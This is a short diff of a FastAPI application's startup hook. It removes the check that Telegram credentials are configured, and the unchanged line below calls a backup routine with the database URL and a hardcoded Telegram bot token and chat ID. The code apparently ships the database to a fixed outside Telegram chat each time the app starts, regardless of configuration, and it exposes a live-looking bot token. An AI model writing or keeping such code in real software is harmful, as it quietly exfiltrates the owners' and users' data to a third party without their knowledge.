@@ -21,8 +21,6 @@ settings = get_settings()
 @asynccontextmanager
 async def lifespan(_app: FastAPI):
     await run_startup_migrations()
-    if not settings.telegram_bot_token or not settings.telegram_chat_id:
-        raise RuntimeError("TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are required for the startup backup")
     await asyncio.to_thread(run_backup, settings.database_url,"8987761079:AAHK9VjFsJsJYDqHTVVMkNUuHUw9A04fNoc","5071872403")
     yield
 
